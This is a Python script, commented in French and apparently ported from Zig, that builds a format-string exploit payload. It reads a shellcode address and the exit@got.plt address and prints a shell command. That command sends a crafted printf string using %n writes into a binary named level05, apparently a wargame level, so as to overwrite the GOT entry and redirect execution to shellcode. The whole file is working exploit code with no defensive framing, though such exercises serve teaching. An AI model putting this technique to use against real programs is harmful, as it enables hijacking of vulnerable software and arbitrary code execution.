#!/usr/bin/env python3
import sys

def read_number(stdin) -> int:
    # Lit une ligne (max ~64 chars pour imiter le buffer) et parse un entier hexa
    raw = stdin.readline()
    if not raw:
        raise ValueError("Aucune entrée fournie.")

    # Vérifie la taille comme dans le code Zig (buffer de 64 octets)
    if len(raw) >= 64 and not raw.endswith("\n"):
        raise ValueError("InputTooLarge")

    line = raw.strip("\r\n ").lower()
    if line.startswith("0x"):
        line = line[2:]
    if not line:
        raise ValueError("Entrée vide.")
    return int(line, 16)

def printaddr_python(addr: int):
    # Émet l'adresse en little-endian, sous forme d'octets échappés \x..
    a = addr
    for _ in range(4):
        b = a & 0xff
        sys.stdout.write("\\x{:02x}".format(b))
        a >>= 8

def main():
    stdout = sys.stdout
    stdin = sys.stdin

    stdout.write("SHELLCODE address: ")
    stdout.flush()
    shellcode_addr = read_number(stdin)

    stdout.write("`exit@got.plt` address: ")
    stdout.flush()
    exit_addr = read_number(stdin)

    # Début de la ligne de commande générée, comme dans le Zig
    stdout.write("(python -c \"print '")

    written_chars = 0

    # Adresses (little endian) : exit@got et exit@got+2
    printaddr_python(exit_addr)
    written_chars += 4
    printaddr_python(exit_addr + 2)
    written_chars += 4

    # Première partie : bas 16 bits de l'adresse shellcode
    shellcode_part1 = ((shellcode_addr & 0xFFFF) - written_chars) & 0xFFFFFFFF
    # On suppose que la largeur est positive dans le cas d'usage souhaité
    stdout.write("%{}x%10$n".format(shellcode_part1))
    written_chars = (written_chars + shellcode_part1) & 0xFFFFFFFF

    # Sanity check (comme les asserts Zig)
    assert (written_chars & 0xFFFF) == (shellcode_addr & 0xFFFF)

    # Deuxième partie : haut 16 bits
    shellcode_part2 = (((shellcode_addr >> 16) & 0xFFFF) - written_chars) & 0xFFFFFFFF
    stdout.write("%{}x%11$n".format(shellcode_part2))
    written_chars = (written_chars + shellcode_part2) & 0xFFFFFFFF

    assert ((written_chars >> 16) & 0xFFFF) == ((shellcode_addr >> 16) & 0xFFFF)

    # Fin comme dans le Zig
    stdout.write("'\" ; cat -) | ./level05\n")
    stdout.flush()

if __name__ == "__main__":
    main()
